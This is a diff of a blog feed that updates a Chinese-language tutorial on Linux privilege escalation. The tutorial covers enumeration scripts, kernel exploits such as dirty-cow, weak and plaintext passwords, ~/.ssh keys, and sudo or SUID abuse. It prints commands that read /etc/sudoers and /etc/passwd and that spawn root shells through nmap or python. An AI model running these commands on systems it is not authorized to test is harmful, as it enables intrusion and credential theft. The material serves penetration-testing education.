@@ -843,28 +843,32 @@
     <link href="http://kevien.github.io/2017/10/10/linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
     <id>http://kevien.github.io/2017/10/10/linux权限提升/</id>
     <published>2017-10-10T04:35:24.000Z</published>
-    <updated>2018-12-01T07:27:03.026Z</updated>
+    <updated>2018-12-01T09:50:37.936Z</updated>
     
     <content type="html"><![CDATA[<p><img src="/2017/10/10/linux权限提升/linuxprivilegeescalation.jpg" alt=""></p>
 <h2 id="Brief"><a href="#Brief" class="headerlink" title="Brief"></a>Brief</h2><ul>
-<li>当我们获取到一个低权限的shell的时候，我们需要提升我们的权限，以方便后面任意读写任意文件、权限维持等等。</li>
+<li>当我们获取到一个低权限的shell的时候，我们往往需要提升我们的权限，以方便后面任意读写任意文件、权限维持等操作。</li>
 <li>这篇文章中我们主要介绍一些常见的linux的权限提升的技巧，这其中包括<br>1.内核提权<br>2.以root权限运行的程序<br>3.已安装的软件<br>4.弱口令和明文密码<br>5.内部的服务<br>6.suid的错误配置<br>7.滥用sudo权限<br>8.以root权限运行的脚本文件<br>9.错误的路径配置<br>10.计划任务<br>11.未装载的文件系统<h2 id="枚举脚本"><a href="#枚举脚本" class="headerlink" title="枚举脚本"></a>枚举脚本</h2></li>
 <li>我之前用三个脚本来枚举一个机器的基本信息，这三个脚本有些不同，但是输出都很相似，所以选择一个你喜欢的就可以。<br><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="external">LinEnum</a></li>
 <li>以下是基本的选项：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-k Enter keyword</div><div class="line">-e Enter export location</div><div class="line">-t Include thorough (lengthy) tests</div><div class="line">-r Enter report name</div><div class="line">-h Displays this help text</div></pre></td></tr></table></figure>
 </li>
 </ul>
 <p><a href="http://pentestmonkey.net/tools/audit/unix-privesc-check" target="_blank" rel="external">Unix privesc</a><br><a href="https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py" target="_blank" rel="external">Linprivchecker.py</a><br><strong>这篇文章总结的比较全了</strong><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="external">Basic Linux Privilege Escalation</a></p>
+<ul>
+<li>或许你不想要脚本，那么可以主要关注以下方面的信息<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1.系统信息  unmae -a,env,whoami,hsitory,pwd</div><div class="line">2.还有谁登陆了或者登陆过这个系统  who,w,last</div><div class="line">3.当前用户是否在sudoers 文件里 sudo -l ,cat /etc/sudoers</div><div class="line">4.是否有其它超级用户 grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &apos;$3 == 0 &#123; print $1&#125;&apos;</div><div class="line">5.查看一下网络信息  ifconfig -a,netstat -antlp,lsof -i</div><div class="line">6.查看运行的服务和进程 ps aux ,ps -ef</div></pre></td></tr></table></figure>
+</li>
+</ul>
 <h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><ul>
 <li>利用linux的内核漏洞有时可以提升我们的权限，我们需要提前测试内核explicit是否对当前的系统、架构以及内核版本是有效的。</li>
 <li>查看系统、架构、内核版本命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">uname -a</div><div class="line">cat /proc/version</div><div class="line">cat /etc/issue</div></pre></td></tr></table></figure>
 </li>
 </ul>
-<h3 id="查找exploit"><a href="#查找exploit" class="headerlink" title="查找exploit"></a>查找exploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">site:exploit-db.com kernel version</div><div class="line"></div><div class="line">python linprivchecker.py extended</div></pre></td></tr></table></figure>
+<h3 id="查找exploit"><a href="#查找exploit" class="headerlink" title="查找exploit"></a>查找exploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">site:exploit-db.com kernel version</div><div class="line"></div><div class="line">python linprivchecker.py extended</div><div class="line"></div><div class="line">#search exploit for linux kernel 2.6 </div><div class="line">searchsploit kernel 2.6 linux | sort -n</div></pre></td></tr></table></figure>
 <p><strong>其中dirty-cow脏牛可以搞定大多的内核！！</strong></p>
 <ul>
-<li>能不用内核漏洞提权尽量就不要用，虽然内核提权是最快且最容易的，但因为它可能会导致系统崩溃或使系统处于一个不稳定的状态，且还会产生大量的日志信息在sys.log 文件中。<h2 id="以root权限运行的程序"><a href="#以root权限运行的程序" class="headerlink" title="以root权限运行的程序"></a>以root权限运行的程序</h2></li>
+<li>能不用内核漏洞提权尽量就不要用，虽然内核提权是最快且最容易的，但因为它可能会导致系统崩溃或使系统处于一个不稳定的状态，且还会产生大量的日志信息在sys.log 文件中。<br><strong>注意！！！在进行内核提权的时候先查看一下大概的代码以及原理，并且在本地最好做一下测试</strong><h2 id="以root权限运行的程序"><a href="#以root权限运行的程序" class="headerlink" title="以root权限运行的程序"></a>以root权限运行的程序</h2></li>
 <li>这个方法的原理就是如果一个服务是以root权限运行的，那么让这个服务去执行命令，那么执行的这个命令也将会是以root权限运行的，查看web服务器、数据库或者其它的服务，典型的例子然是<br>mysql的，如下：</li>
-<li>查看有哪些正在运行的程序<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># Metasploit</div><div class="line">ps</div><div class="line"></div><div class="line"># Linux</div><div class="line">ps aux</div></pre></td></tr></table></figure>
+<li>查看有哪些正在运行的程序<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Metasploit</div><div class="line">ps</div><div class="line"># Linux</div><div class="line">ps aux</div></pre></td></tr></table></figure>
 </li>
 </ul>
 <h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><ul>
@@ -873,20 +877,21 @@
 </ul>
 <p>如果这个不行可以使用UDF进行提权.<a href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/" target="_blank" rel="external">UDF提权</a></p>
 <h2 id="用户安装的软件"><a href="#用户安装的软件" class="headerlink" title="用户安装的软件"></a>用户安装的软件</h2><ul>
-<li>用户安装的第三方软件是否是存在漏洞的，如果有的话可以google一下exploit。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"># 常见的安装软件目录</div><div class="line">/usr/local/</div><div class="line">/usr/local/src</div><div class="line">/usr/local/bin</div><div class="line">/opt/</div><div class="line">/home</div><div class="line">/var/</div><div class="line">/usr/src/</div><div class="line"></div><div class="line"># Debian</div><div class="line">dpkg -l</div><div class="line"></div><div class="line"># CentOS, OpenSuse, Fedora, RHEL</div><div class="line">rpm -qa (CentOS / openSUSE )</div><div class="line"></div><div class="line"># OpenBSD, FreeBSD</div><div class="line">pkg_info</div></pre></td></tr></table></figure>
+<li><p>用户安装的第三方软件是否是存在漏洞的，如果有的话可以google一下exploit。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"># 常见的安装软件目录</div><div class="line">/usr/local/</div><div class="line">/usr/local/src</div><div class="line">/usr/local/bin</div><div class="line">/opt/</div><div class="line">/home</div><div class="line">/var/</div><div class="line">/usr/src/</div><div class="line"></div><div class="line"># Debian</div><div class="line">dpkg -l</div><div class="line"></div><div class="line"># CentOS, OpenSuse, Fedora, RHEL</div><div class="line">rpm -qa (CentOS / openSUSE )</div><div class="line"></div><div class="line"># OpenBSD, FreeBSD</div><div class="line">pkg_info</div></pre></td></tr></table></figure>
 </li>
-</ul>
-<h2 id="弱口令或者明文密码"><a href="#弱口令或者明文密码" class="headerlink" title="弱口令或者明文密码"></a>弱口令或者明文密码</h2><ul>
+<li><p>然后查找对应的软件是否有漏洞</p>
+<h2 id="弱口令或者明文密码"><a href="#弱口令或者明文密码" class="headerlink" title="弱口令或者明文密码"></a>弱口令或者明文密码</h2></li>
 <li>检查一下web服务器连接数据库的配置文件(例如config.php)</li>
-<li>检查一下数据库的管理员密码，这个密码可能是重用了的。</li>
+<li>检查一下数据库的管理员密码，这个密码可能被重用。</li>
 <li><p>检测一下弱口令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">username:username</div><div class="line">username:username1</div><div class="line">username:root</div><div class="line">username:admin</div><div class="line">username:qwerty</div><div class="line">username:password</div></pre></td></tr></table></figure>
 </li>
 <li><p>检查一下明文密码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Anything interesting the the mail?</div><div class="line">/var/spool/mail</div><div class="line"></div><div class="line">./LinEnum.sh -t -k password</div></pre></td></tr></table></figure>
 </li>
-</ul>
-<h2 id="只能内部访问的服务"><a href="#只能内部访问的服务" class="headerlink" title="只能内部访问的服务"></a>只能内部访问的服务</h2><ul>
+<li><p>检查一下 ~/.ssh 文件夹 以及其它用户的.ssh目录 </p>
+<h2 id="只能内部访问的服务"><a href="#只能内部访问的服务" class="headerlink" title="只能内部访问的服务"></a>只能内部访问的服务</h2></li>
 <li>一些服务可能只是对内开放，外部是访问不了的，比如说部署服务器、数据库或者其它，这些服务可以是以root权限运行的，这些服务恰恰有可能是有漏洞的，因为开发者或者用户可能会认为因为服务只是内部使用所以就放松了警惕。</li>
 <li>使用netstat对比一下nmap的扫描结果<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># Linux</div><div class="line">netstat -anlp</div><div class="line">netstat -ano</div></pre></td></tr></table></figure>
 </li>
@@ -907,8 +912,10 @@
 <li><p>nmap</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">低版本的nmap3.x 有interactive模式，且设置了suid，这个时候可以进入交互模式 执行!sh 命令即可轻松完成提权。</div></pre></td></tr></table></figure>
 </li>
-<li><p>python</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’</div></pre></td></tr></table></figure>
+</ul>
+<p><img src="/2017/10/10/linux权限提升/nmaproot.png" alt=""></p>
+<ul>
+<li>python<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’</div></pre></td></tr></table></figure>
 </li>
 </ul>
 <p><img src="/2017/10/10/linux权限提升/python.png" alt=""></p>
